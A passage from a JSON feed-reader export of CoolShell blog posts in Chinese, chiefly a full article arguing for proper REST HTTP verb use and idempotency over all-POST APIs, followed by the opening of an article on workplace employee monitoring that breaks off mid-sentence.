          "pubDate": "Thu, 05 May 2022 08:13:37 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "fab8b5cc4a9081ad10669b6e52fa122d",
          "highlights": []
        },
        {
          "title": "“一把梭：REST API 全用 POST”",
          "description": "<p>写这篇文章的原因主要还是因为V2EX上的这个贴子，这个贴子中说—— “对接同事的接口，他定义的所有接口都是 post 请求，理由是 https 用 post 更...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/22173.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/22173.html\">“一把梭：REST API 全用 POST”</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright wp-image-22176\" src=\"https://coolshell.cn/wp-content/uploads/2022/02/http_method-300x169.png\" alt=\"\" width=\"325\" height=\"183\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/02/http_method-300x169.png 300w, https://coolshell.cn/wp-content/uploads/2022/02/http_method-1024x576.png 1024w, https://coolshell.cn/wp-content/uploads/2022/02/http_method-768x432.png 768w, https://coolshell.cn/wp-content/uploads/2022/02/http_method-480x270.png 480w, https://coolshell.cn/wp-content/uploads/2022/02/http_method.png 1200w\" sizes=\"(max-width: 325px) 100vw, 325px\" /></p>\n<p>写这篇文章的原因主要还是因为V2EX上的这个<a href=\"https://www.v2ex.com/t/830030?p=1\" target=\"_blank\" rel=\"noopener\">贴子</a>，这个贴子中说——</p>\n<blockquote><p>“对接同事的接口，他定义的所有接口都是 post 请求，理由是 https 用 post 更安全，之前习惯使用 restful api ，如果说 https 只有 post 请求是安全的话？那为啥还需要 get 、put 、delete ？我该如何反驳他。”</p></blockquote>\n<p>然后该贴中大量的回复大概有这么几种论调，1）POST挺好的，就应该这么干，沟通少，2）一把梭，早点干完早点回家，3）吵赢了又怎么样？工作而已，优雅不能当饭吃。虽然评论没有一边倒，但是也有大量的人支持。然后，我在Twitter上嘲讽了一下，用POST干一切就像看到了来你家装修工人说，“老子干活就是用钉子钉一切，什么螺丝、螺栓、卡扣、插销……通通不用，钉枪一把梭，方便，快捷，安全，干完早回家……不过，还是有一些网友觉得用POST挺好的，而且可以节约时间。所以，正好，我在《<a title=\"我做系统架构的一些原则\" href=\"https://coolshell.cn/articles/21672.html\" target=\"_blank\" rel=\"noopener\">我做系统架构的原则</a>》中的“<a href=\"https://coolshell.cn/articles/21672.html#%E5%8E%9F%E5%88%99%E4%BA%94%EF%BC%9A%E5%88%B6%E5%AE%9A%E5%B9%B6%E9%81%B5%E5%BE%AA%E6%9C%8D%E4%BB%8E%E6%A0%87%E5%87%86%E3%80%81%E8%A7%84%E8%8C%83%E5%92%8C%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5\" target=\"_blank\" rel=\"noopener\">原则五</a>”中反对API返回码无论对错全是200的返回那，我专门写下这一篇文章，以正视听。</p>\n<p>这篇文章主要分成下面这几个部分：</p>\n<ol>\n<li>为什么要用不同的HTTP动词？</li>\n<li>Restful 进行复杂查询</li>\n<li>几个主要问题的回应\n<ul>\n<li>POST 更安全吗？</li>\n<li>全用 POST 可以节省时间沟通少吗？</li>\n<li>早点回家的正确姿势</li>\n<li>工作而已，优雅不能当饭吃</li>\n</ul>\n</li>\n</ol>\n<p><span id=\"more-22173\"></span></p>\n<h4>为什么要用不同的HTTP动词</h4>\n<p>编程世界通常来说有两种逻辑：“<strong>业务逻辑</strong>” 和 “<strong>控制逻辑</strong>”。</p>\n<ul>\n<li><strong>业务逻辑</strong>。就是你实现业务需求的功能的代码，就是跟用户需求强相关的代码。比如，把用户提交的数据保存起来，查询用户的数据，完成一个订单交易，为用户退款……等等，这些是业务逻辑</li>\n<li><strong>控制逻辑</strong>。就是我们用于控制程序运行的非功能性的代码。比如，用于控制程序循环的变量和条件，使用多线程或分布式的技术，使用HTTP/TCP协议，使用什么样数据库，什么样的中间件……等等，这些跟用户需求完全没关系的东西。</li>\n</ul>\n<p>网络协议也是一样的，一般来说，<strong>几乎所有的主流网络协议都有两个部分，一个是协议头，一个是协议体。协议头中是协议自己要用的数据，协议体才是用户的数据。所以，协议头主要是用于协议的控制逻辑，而协议体则是业务逻辑。</strong></p>\n<p>HTTP的动词（或是Method）是在协议头中，所以，其主要用于控制逻辑。</p>\n<p dir=\"auto\">下面是HTTP的动词规范，一般来说，REST API 需要开发人员严格遵循下面的标准规范（参看<a href=\"https://www.rfc-editor.org/rfc/rfc7231#section-4.2.2\" target=\"_blank\" rel=\"noopener\">RFC7231 章节4.2.2 &#8211; Idempotent Methods</a>）</p>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n<th>幂等</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GET</td>\n<td>用于查询操作，对应于数据库的 <code>select</code> 操作</td>\n<td style=\"text-align: center;\"><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" />︎</td>\n</tr>\n<tr>\n<td>PUT</td>\n<td>用于所有的信息更新，对应于数据库的 <code>update </code>操作</td>\n<td style=\"text-align: center;\"><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" />︎︎</td>\n</tr>\n<tr>\n<td>DELETE</td>\n<td>用于更新操作，对应于数据库的 <code>delete</code> 操作</td>\n<td style=\"text-align: center;\"><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" />︎︎</td>\n</tr>\n<tr>\n<td>POST</td>\n<td>用于新增操作，对应于数据库的 <code>insert</code> 操作</td>\n<td style=\"text-align: center;\">✘</td>\n</tr>\n<tr>\n<td>HEAD</td>\n<td>用于返回一个资源对象的“元数据”，或是用于探测API是否健康</td>\n<td style=\"text-align: center;\"><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" />︎</td>\n</tr>\n<tr>\n<td>PATCH</td>\n<td>用于局部信息的更新，对应于数据库的 <code>update</code> 操作</td>\n<td style=\"text-align: center;\">✘</td>\n</tr>\n<tr>\n<td>OPTIONS</td>\n<td>获取API的相关的信息。</td>\n<td style=\"text-align: center;\"><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" />︎</td>\n</tr>\n</tbody>\n</table>\n<p>其中，<code>PUT</code> 和 <code>PACTH</code> 都是更新业务资源信息，如果资源对象不存在则可以新建一个，但他们两者的区别是，<code>PUT</code> 用于更新一个业务对象的所有完整信息，就像是我们通过表单提交所有的数据，而 <code>PACTH</code> 则对更为API化的数据更新操作，只需要更需要更新的字段（参看 <a href=\"http://tools.ietf.org/html/rfc5789\" rel=\"nofollow\">RFC 5789</a> ）。</p>\n<p>当然，现实世界中，可能并不一定严格地按照数据库操作的CRUD来理解API，比如，你有一个登录的API <code>/login</code> 你觉得这个API应该是 <code>GET</code> ，<code>POST</code>，<code>PUT</code> 还是 <code>PATCH</code> ?登录的时候用户需要输入用户名和密码，然后跟数据库里的对比（select操作）后反回一个登录的session token，然后这个token作为用户登录的状态令牌。如果按上面表格来说，应该是 select 操作进行 <code>GET</code> ，但是从语义上来说，登录并不是查询信息，应该是用户状态的更新或是新增操作（新增session），所以还是应该使用 <code>POST</code>，而 <code>/logout</code> 你可以使用 <code>DELETE</code> 。<strong>这里相说明一下，不要机械地通过数据库的CRUD来对应这些动词，很多时候，还是要分析一下业务语义。</strong></p>\n<p><strong>另外，我们注意到，在这个表格的最后一列中加入了“是否幂等”的，API的幂等对于控制逻辑来说是一件很重要的事。</strong>所谓幂等，就是该API执行多次和执行一次的结果是完全一样的，没有副作用。</p>\n<ul>\n<li><code>POST</code> 用于新增加数据，比如，新增一个交易订单，这肯定不能是幂等的</li>\n<li><code>DELETE</code> 用于删除数据，一个数据删除多次和删除一次的结果是一样的，所以，是幂等的</li>\n<li><code>PUT</code> 用于全部数更新，所以，是幂等的。</li>\n<li><code>PATCH</code>用于局部更新，比如，更新某个字段 cnt = cnt+1，明显不可能是幂等操作。</li>\n</ul>\n<p>幂等这个特性对于远程调用是一件非常关键的事，就是说，远程调用有很多时候会因为网络原因导致调用timeout，对于timeout的请求，我们是无法知道服务端是否已经是收到请求并执行了，此时，我们不能贸然重试请求，对于不是幂等的调用来说，这会是灾难性的。比如像转帐这样的业务逻辑，转一次和转多次结果是不一样的，如果重新的话有可能就会多转了一次。所以，这个时候，如果你的API遵从了HTTP动词的规范，那么你写起程序来就可以明白在哪些动词下可以重试，而在哪些动词下不能重试。如果你把所有的API都用POST来表达的话，就完全失控了。</p>\n<p>除了幂等这样的控制逻辑之外，你可能还会有如下的这些控制逻辑的需求：</p>\n<ul>\n<li><strong>缓存</strong>。通过CDN或是网关对API进行缓存，很显然，我们要在查询<code>GET</code> 操作上建议缓存。</li>\n<li><strong>流控</strong>。你可以通过HTTP的动词进行更粒度的流控，比如：限制API的请用频率，在读操作上和写操作上应该是不一样的。</li>\n<li><strong>路由</strong>。比如：写请求路由到写服务上，读请求路由到读服务上。</li>\n<li><strong>权限</strong>。可以获得更细粒度的权限控制和审计。</li>\n<li><strong>监控</strong>。因为不同的方法的API的性能都不一样，所以，可以区分做性能分析。</li>\n<li><strong>压测</strong>。当你需要压力测试API时，如果没有动词的区分的话，我相信你的压力测试很难搞吧。</li>\n<li>……等等</li>\n</ul>\n<p>也许，你会说，我的业务太简单了，没有必要搞这么复杂。OK，没有问题，但<strong>是我觉得你最差的情况下，也是需要做到“读写分离”的，就是说，至少要有两个动词，<code>GET</code> 表示是读操作，<code>POST</code>表示是写操作。</strong></p>\n<h4>Restful 复杂查询</h4>\n<p>一般来说，对于查询类的API，主要就是要完成四种操作：排序，过滤，搜索，分页。下面是一些相关的规范。参考于两个我觉得写的最好的Restful API的规范文档，<a href=\"https://github.com/microsoft/api-guidelines/blob/vNext/Guidelines.md\" target=\"_blank\" rel=\"noopener\">Microsoft REST API Guidelines</a>，<a href=\"https://github.com/paypal/api-standards/blob/master/api-style-guide.md\" target=\"_blank\" rel=\"noopener\">Paypal API Design Guidelines</a>。</p>\n<ul dir=\"auto\">\n<li>\n<p dir=\"auto\"><strong>排序</strong>。对于结果集的排序，使用 <code>sort</code> 关键字，以及 <code>{field_name}|{asc|desc},{field_name}|{asc|desc}</code> 的相关语法。比如，某API需要返回公司的列表，并按照某些字段排序，如：<code>GET /admin/companies?sort=rank|asc</code> 或是 <code>GET /admin/companies?sort=rank|asc,zip_code|desc</code></p>\n</li>\n<li>\n<p dir=\"auto\"><strong>过滤</strong>。对于结果集的过滤，使用 <code>filter</code> 关键字，以及 <code>{field_name} op{value}</code> 的语法。比如： <code>GET /companies?category=banking&amp;location=china</code> 。但是，有些时候，我们需要更为灵活的表达式，我们就需要在URL上构造我们的表达式。这里需要定义六个比较操作：<code>=</code>，<code>&lt;</code>，<code>&gt;</code>，<code>&lt;=</code>，<code>&gt;=</code>，以及三个逻辑操作：<code>and</code>，<code>or</code>，<code>not</code>。（表达式中的一些特殊字符需要做一定的转义，比如：<code>&gt;=</code> 转成 <code>ge</code>）于是，我们就会有如下的查询表达式：<code>GET /products?$filter=name eq 'Milk' and price lt 2.55</code> 查找所有的价柗小于2.55的牛奶。</p>\n</li>\n<li>\n<p dir=\"auto\"><strong>搜索</strong>。对于相关的搜索，使用 <code>search</code> 关键字，以及关键词。如：<code>GET /books/search?description=algorithm</code> 或是直接就是全文搜索 <code>GET /books/search?key=algorithm</code> 。</p>\n</li>\n<li>\n<p dir=\"auto\"><strong>分页</strong>。对于结果集进行分页处理，分页必需是一个默认行为，这样不会产生大量的返回数据。</p>\n<ul dir=\"auto\">\n<li>使用<code>page</code>和<code>per_page</code>代表页码和每页数据量，比如：<code>GET /books?page=3&amp;per_page=20</code>。</li>\n<li><strong>可选</strong>。上面提到的<code>page</code>方式为使用相对位置来获取数据，可能会存在两个问题：性能（大数据量）与数据偏差（高频更新）。此时可以使用绝对位置来获取数据：事先记录下当前已获取数据里最后一条数据的<code>ID</code>、<code>时间</code>等信息，以此获取 “<strong>该ID之前的数据</strong>” 或 “<strong>该时刻之前的数据</strong>”。示例：<code>GET /news?max_id=23454345&amp;per_page=20</code> 或 <code>GET /news?published_before=2011-01-01T00:00:00Z&amp;per_page=20</code>。\n<p dir=\"auto\">\n</li>\n</ul>\n</li>\n</ul>\n<p dir=\"auto\"><strong>注意：这里需要注意一下，在理论上来说<code>GET</code>是可以带 body 的，但是很多程序的类库或是中间件并不支持 GET 带 body，导致你只能用 POST 来传递参数。这里的原则是：</strong></p>\n<ol dir=\"auto\">\n<li>\n<p dir=\"auto\"><strong>对于简单的查询，很多参数都设计在 restful API 的路径上了，而 filter/sort/pagination 也不会带来很多的复杂，所以应该使用 <code>GET</code> </strong></p>\n</li>\n<li><strong>对于复杂的查询来说，可能会有很复杂的查询参数，比如：ElasticSearch 上的 <code>index/_search</code>里的 DSL，你也应该尽可能的使用 <code>GET</code>，而不是<code>POST</code> 除非客观条件上不支持<code>GET</code>。ElasticSearch 的<a href=\"https://www.elastic.co/guide/en/elasticsearch/guide/current/_empty_search.html\" target=\"_blank\" rel=\"noopener\">官方文档</a>里也是这么说的。</strong></li>\n</ol>\n<blockquote><p>The authors of Elasticsearch prefer using GET for a search request because they feel that it describes the action—​retrieving information—​better than the POST verb. （我们推荐使用 GET而不是 POST，因为语义更清楚）However, because GET with a request body is not universally supported, the search API also accepts POST requests （除非你的类库或是服务器不支持 GET带参数 ，你再用POST，我们两个都支持）</p>\n<p><strong>陈皓注：但是在 ElasticSearch 7.11 后，GET 也不支持 body 了。这是 ElasticSearch 的设计和实现不对应了。</strong></p></blockquote>\n<div id=\"message-accessories-1073072655571370085\" class=\"container-2sjPya\">\n<div class=\"messageAttachment-CZp8Iv messageAttachmentNoJustify-lIzP9c\">\n<div class=\"imageContent-3Av-9c embedWrapper-1MtIDg attachmentContentItem-UKeiCx\">\n<div class=\"imageContainer-10XenG\">\n<div class=\"imageWrapper-oMkQl4 imageZoom-3yLCXY clickable-LksVCf\">另外，对于一些更为复杂的操作，建议通过分别调用多个API的方式来完成，虽然这样会增加网络请求的次数，但是这样的可以让后端程序和数据耦合度更小，更容易成为微服务的架构。</div>\n</div>\n</div>\n</div>\n</div>\n<p>最后，如果你想在Rest中使用像GraphQL那样的查询语言，你可以考虑一下类似 <a href=\"https://www.odata.org/\" target=\"_blank\" rel=\"noopener\">OData</a> 的解决方案。OData 是 Open Data Protocol 的缩写，最初由 Microsoft 于 2007 年开发。它是一种开放协议，使您能够以简单和标准的方式创建和使用可查询和可互操作的 RESTful API。</p>\n<h4>几个主要问题的回应</h4>\n<p>下面是对几个问题的直接回应，如果大家需要我回应更多的问题，可以在后面留言，我会把问题和我的回应添加到下面。</p>\n<h5>1）为什么API 要Restful，并符合规范？</h5>\n<p><strong>Restful API算是一个HTTP的规范和标准了，你要说是最佳实践也好，总之，它是一个全世界对HTTP API的一个共识。在这个共识上，你可以无成本地享受很多的技术红利，比如：CDN，API网关，服务治理，监控……等等。这些都是可以让你大幅度降低研发成本，避免踩坑的原因。</strong></p>\n<h5>2）为什么“过早优化”不适用于API设计？</h5>\n<p>因为API是一种契约，一旦被使用上，就很难再变更了，就算你发行新的版本的API，你还要驱动各种调用方升级他们的调用方式。所以，接口设计就像数据库模式设计一下，一旦设计好了，未来再变更就比较难了。所以，还是要好好设计。正如前面我给的几个文档——<a href=\"https://github.com/microsoft/api-guidelines/blob/vNext/Guidelines.md\" target=\"_blank\" rel=\"noopener\">Microsoft REST API Guidelines</a>，<a href=\"https://github.com/paypal/api-standards/blob/master/api-style-guide.md\" target=\"_blank\" rel=\"noopener\">Paypal API Design Guidelines</a> 或是 <a href=\"https://cloud.google.com/apis/design\" target=\"_blank\" rel=\"noopener\">Google API Design Guide</a> 都是让你好好设计API的不错的 Guidelines.</p>\n<h5>3）POST 更安全吗？</h5>\n<p>不会。</p>\n<p>很多同学以为 <code>GET</code> 的请求数据在URL中，而 <code>POST</code> 的则不是，所以以为 <code>POST</code> 更安全。不是这样的，整个请求的HTTP URL PATH会全部封装在HTTP的协议头中。只要是HTTPS，就是安全的。当然，有些网关如nginx会把URL打到日志中，或是会放在浏览器的历史记录中，所以有人会说 <code>GET</code> 请求不安全，但是，<code>POST</code> 也没有好到哪里去，在 <a href=\"https://en.wikipedia.org/wiki/Cross-site_request_forgery\" target=\"_blank\" rel=\"noopener\">CSRF</a> 这个最常见的安全问题上，则完全就是针对 <code>POST</code> 的。  安全是一件很复杂的事，无论你用哪方法或动词都会不能代表你会更安全。</p>\n<p>另外，</p>\n<ul>\n<li>如果你要 防止你的 <code>GET</code> 上有敏感信息，应该加个密，这个跟 <code>POST</code>是一样的。</li>\n<li>如果你要防止 <code>GET</code> 会被中间人修改，你应该做一个URL签名。（通常来说， 我们都在 <code>GET</code> 上做签名，<code>POST</code> 就忘做了）</li>\n<li>如果你要防止有人发一些恶意链接来 hack 你的用户（传说中的 <code>GET</code> 不如 <code>POST</code> 安全的一个问题），你应该用 HMAC 之类的认证技术做好认证（参看 <a title=\"HTTP API 认证授权术\" href=\"https://coolshell.cn/articles/19395.html\" target=\"_blank\" rel=\"noopener\">HTTP API 认证授权术</a>）。</li>\n</ul>\n<p>总之，你要明白，<code>GET</code> 和 <code>POST</code> 的安全问题都一样的，不要有谁比谁更安全，然后你就可以掉以轻心的这样的想法，安全都是要很严肃对待的。</p>\n<h5>4）全用 POST 可以节省时间减少沟通吗？</h5>\n<p>不但不会，反而更糟糕。</p>\n<p>说这种话的人，我感觉是不会思考问题。</p>\n<ul>\n<li>其一，为API赋于不同的动词，这个几乎不需要时间。把CRUD写在不同的函数下也是一种很好的编程风格。另外现在几乎所有的开发框架都支持很快速的CRUD的开发，比如Spring Boot，写数据库的CRUD基本上就不需要写SQL语言相关的查询代码，非常之方便。</li>\n<li>其二，使用规范的方式，可以节约新加入团队人员的学习成本，而且可以大大减少跨团队的沟能成本。规范和标准其实就是在节约团队时间提升整体效率的，这个我们整个人类进行协作的基础。所以，这个世界上有很多的标准，你只要照着这个标准来，你的所生产的零件就可以适配到其它厂商的产品上。而不需要相互沟通。</li>\n<li>其三，全用POST接口一把梭，不规范不标准，使用你的这个山寨API的人就得来不断的问你，反而增加了沟通。另外，也许你开发业务功能很快了，但是你在做控制逻辑的时候，你就要返工了，从长期上来讲，你的欠下了技术债，这个债反而导致了更大的成本。</li>\n</ul>\n<h5>5）早点回家的正确姿势</h5>\n<p>不要以为你回家早就没事了，如果你的代码有这样那样的问题，别人看懂，或是出误用了你的代码出了问题，那么，你早回家有什么意义呢？你一样要被打扰，甚至被叫到公司来处理问题。所以，你应该做的是为了“长期的早回家”，而不是“短期的早回家”，要像长期的早回家，通常来说是这样的：</p>\n<ul>\n<li><strong>把代码组织设计好，有更好的扩展性</strong>。这样在面对新需求的时候，你就可以做到少改代码，甚至不改代码。这样你才可能早回家。不然，每次需求一来，你得重新写，你怎么可能早回家？</li>\n<li><strong>你的代码质量是不错的，有不错的文档和注释</strong>。所以，别人不会老有问题来找你，或是你下班后，叫你来处理问题。甚至任何人都可以很容易地接手你的代码，这样你才可能真正不被打扰</li>\n</ul>\n<h5>6）工作而已，优雅不能当饭吃</h5>\n<p>回应两点：</p>\n<p>其一，遵循个规范而已，把“正常”叫“优雅”，可见标准有多低。这么低的标准也只能“为了吃饭而生存了”。</p>\n<p>其二，<strong>作为一个“职业程序员”，要学会热爱和尊重自己的职业，热爱自己职业最重要的就是不要让外行人看扁这个职业，自己都不尊重这个职业，你让别人怎么尊重？尊重自己的职业，不仅仅只是能够获得让人羡慕的报酬，而更是要让自己的这个职业的更有含金量</strong>。</p>\n<p><strong>希望大家都能尊重自己从事的这个职业，成为真正的职业化的程序员，而不是一个码农！</strong></p>\n<figure id=\"attachment_22177\" aria-describedby=\"caption-attachment-22177\" style=\"width: 834px\" class=\"wp-caption aligncenter\"><img decoding=\"async\" loading=\"lazy\" class=\"wp-image-22177 size-full\" src=\"https://coolshell.cn/wp-content/uploads/2022/02/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75.jpeg\" alt=\"\" width=\"834\" height=\"319\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/02/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75.jpeg 834w, https://coolshell.cn/wp-content/uploads/2022/02/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75-300x115.jpeg 300w, https://coolshell.cn/wp-content/uploads/2022/02/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75-768x294.jpeg 768w, https://coolshell.cn/wp-content/uploads/2022/02/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75-604x231.jpeg 604w\" sizes=\"(max-width: 834px) 100vw, 834px\" /><figcaption id=\"caption-attachment-22177\" class=\"wp-caption-text\">你的工作给你权力，而只有你的行为才会给你尊重</figcaption></figure>\n<p>（全文完）<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/22298.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png\" alt=\"聊聊团队协同和协同工具\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/22298.html\" class=\"wp_rp_title\">聊聊团队协同和协同工具</a></li><li ><a href=\"https://coolshell.cn/articles/22157.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg\" alt=\"谈谈公司对员工的监控\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/22157.html\" class=\"wp_rp_title\">谈谈公司对员工的监控</a></li><li ><a href=\"https://coolshell.cn/articles/21589.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg\" alt=\"如何做一个有质量的技术分享\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21589.html\" class=\"wp_rp_title\">如何做一个有质量的技术分享</a></li><li ><a href=\"https://coolshell.cn/articles/20977.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png\" alt=\"程序员如何把控自己的职业\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/20977.html\" class=\"wp_rp_title\">程序员如何把控自己的职业</a></li><li ><a href=\"https://coolshell.cn/articles/20765.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/01/remote-150x150.jpg\" alt=\"MegaEase的远程工作文化\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/20765.html\" class=\"wp_rp_title\">MegaEase的远程工作文化</a></li><li ><a href=\"https://coolshell.cn/articles/20276.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/12/open-your-creative-mind-150x150.jpg\" alt=\"别让自己“墙”了自己\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/20276.html\" class=\"wp_rp_title\">别让自己“墙”了自己</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/22173.html\">“一把梭：REST API 全用 POST”</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "技术新闻",
          "link": "https://coolshell.cn/articles/22173.html",
          "creator": "陈皓",
          "pubDate": "Sun, 13 Feb 2022 04:28:47 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "9b289309664f1347deda7268f64a64cc",
          "highlights": []
        },
        {
          "title": "谈谈公司对员工的监控",
          "description": "<p>今天看到微博上有一个热点事件， 是一个关于某公司做的一个监控员工离职倾向的软件，从截图中可以看到员工访问招聘网站的次数，还有投递的简历以及搜索的关建词等等信息，...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/22157.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/22157.html\">谈谈公司对员工的监控</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script>今天看到微博上有一个热点事件， 是一个关于某公司做的一个监控员工离职倾向的软件，从截图中可以看到员工访问招聘网站的次数，还有投递的简历以及搜索的关建词等等信息，通过这些信息分析员工的离职倾向。然后我发一个微博，说了一下，我以前工作过的公司无论外国公司还是中国公司都有这样的情况，收到一些人来问我相关的情况，所以，我想还是写篇文章详细地说一下，我对这种事情的看法。</p>\n<p><a href=\"https://coolshell.cn/wp-content/uploads/2022/02/monitoring.jpeg\"><img decoding=\"async\" loading=\"lazy\" class=\"aligncenter wp-image-22159 size-large\" src=\"https://coolshell.cn/wp-content/uploads/2022/02/monitoring-1024x534.jpeg\" alt=\"\" width=\"640\" height=\"334\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/02/monitoring-1024x534.jpeg 1024w, https://coolshell.cn/wp-content/uploads/2022/02/monitoring-300x156.jpeg 300w, https://coolshell.cn/wp-content/uploads/2022/02/monitoring-768x400.jpeg 768w, https://coolshell.cn/wp-content/uploads/2022/02/monitoring-1536x801.jpeg 1536w, https://coolshell.cn/wp-content/uploads/2022/02/monitoring-518x270.jpeg 518w, https://coolshell.cn/wp-content/uploads/2022/02/monitoring.jpeg 1920w\" sizes=\"(max-width: 640px) 100vw, 640px\" /></a></p>\n<p>本文分成下面个部分：</p>\n<ul>\n<li>公司监控员工的技术手段有哪些？</li>\n<li>为什么要监控员工？</li>\n<li>外企和国企有什么不一样？</li>\n<li>我对此事的看法</li>\n</ul>\n<p><span id=\"more-22157\"></span></p>\n<h4>技术手段</h4>\n<p>下面是我经历过的几个手段：</p>\n<p>1）<strong>通过网络嗅探的方式</strong>。也就是说，你只要上了公司的网络，你个人设备上的通讯信息就可以被人以网络抓包+分析的方式进行分析。当然，这样的手段已经不怎么好用了，因为现在的网络基本上都是HTTPS加密的，网络嗅探的方式只能知道你访问了什么IP，对于其中的数据是没有办法知道的。</p>\n<p>2）<strong>通过使用公司提供的软硬件工具</strong>。你使用公司的电子邮箱，浏览器（或是公司的代理服务器），通讯工具（包括语音电话），手机办公应用……等来处理你的个人事宜的时候，必然会被监控。这样，你只需要不要使用公司的软件来处理自己的私事就好了。</p>\n<p>3）<strong>通过安装一个监控程序</strong>。这个是最可怕的了，因为无论你加不加密都没用了。一般来说，你不安装这个程序，你就没有办法连上网络，包括公司内网和外网。这个监控程序，会收集你电脑或手机上能够收集的到的所有的信息，比如，你的网络信息，按键操作，录屏，软件数据……等等。</p>\n<p>4）<strong>办公区监控</strong>。我见过的还有使用摄像头，在会议室中安装声音和视频监控设备，对整个办公区内发生所有的事情进行监控。</p>\n<p><strong>5）通过爬虫。</strong>通过爬虫分析员工的社交平台上的各种言论，包括招聘网站。除了公司需要分布和自己相关的舆情，同样也开始监控员工的行为和价值观等。这已经不是监控隐私信息了……</p>\n<h4>公司监控的目的</h4>\n<p>公司监控的目的最早就是为了防止自己公司内的数据和信息外泄，所以，他们害怕自己的员工访问了什么不合适的网站，或是下载了什么有恶意的软件，或是不小心发错了邮件。另外一些公司也会使用外包人员，所以，对于外部编制的人员更需要有信息泄漏防范的安全需求。当然，也害怕有一些商业间谍或是自己的员工被收买了窃取公司内部的敏感信息。尤其是对于一些本身就是做数据的公司，如我以前呆过的Thomson 